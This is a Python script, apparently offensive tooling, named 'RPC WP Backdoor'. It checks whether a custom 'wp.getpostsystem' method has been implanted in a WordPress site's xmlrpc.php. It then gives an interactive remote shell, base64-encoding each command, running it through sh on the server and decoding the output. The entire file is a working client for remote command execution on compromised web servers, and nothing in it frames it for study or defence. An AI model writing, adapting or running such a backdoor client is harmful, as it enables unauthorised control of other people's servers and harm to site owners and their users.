#!/bin/python
# coding: utf-8
# RPC WP Backdoor
# 
import requests, sys, os, base64
from xml.etree import ElementTree
import urllib3
urllib3.disable_warnings()


def check(host):

    try:
        r = requests.post(host + '/xmlrpc.php', data='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getpostsystem</methodName><params><param><value>echo "kopslive"</value></param></params></methodCall>', verify=False)
    except:
        return False
    if(r.status_code == 200):
        
        if 'kopslive' in r.text:
            return True
        else:
            return False
    else:
        return False

def rpc_call(host, cmd):
    postcmd = cmd.encode('utf-8')
    enccmd = base64_bytes = base64.b64encode(postcmd)
    cmd = 'echo ' + enccmd +'|base64 -d|sh|base64 -w0'
    r = requests.post(host + '/xmlrpc.php', data='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getpostsystem</methodName><params><param><value>'+cmd+'</value></param></params></methodCall>', verify=False)
 
    if(r.status_code == 200):
    
       document = ElementTree.fromstring(r.text)
       return document[0][0][0][0].text
    else:
        return "[X] RPC ERROR."
def clear():
    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')

def cmd(host):

    cmd = raw_input("[RPC Backdoor]$ ")
    while cmd != "exit":
        if(cmd == 'clear'):
            clear()
        else:
            if(cmd != ""):
                try:
                    rpc_reply = rpc_call(host, cmd)
                    rpc_decode = base64.b64decode(str(rpc_reply))
                    print(rpc_decode.decode('utf-8'))
                except:
                    print("[X] RPC communication error")
            cmd = raw_input("[RPC Backdoor]$ ")
    print("[😈] Leaving RPC Backdoor...")
    return
def main():
    if(len(sys.argv) < 2):
        print("[USE]: {} https://target.com.br".format(sys.argv[0]))
    else:
        if(check(sys.argv[1])):
            print('[::] RPC is live!')
            pshell = raw_input("[::] Start shell (y/n): ")
            if(pshell == 'Y3' or pshell == 'y'):
                print("\r[😈] Starting RPC Backdoor...")
                cmd(sys.argv[1])
            else:
                print("[!] Exit")
        else:
            print('[::] RPC Backdoor not implanted or unavailable...')
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print("[😈] Leaving RPC Backdoor...")
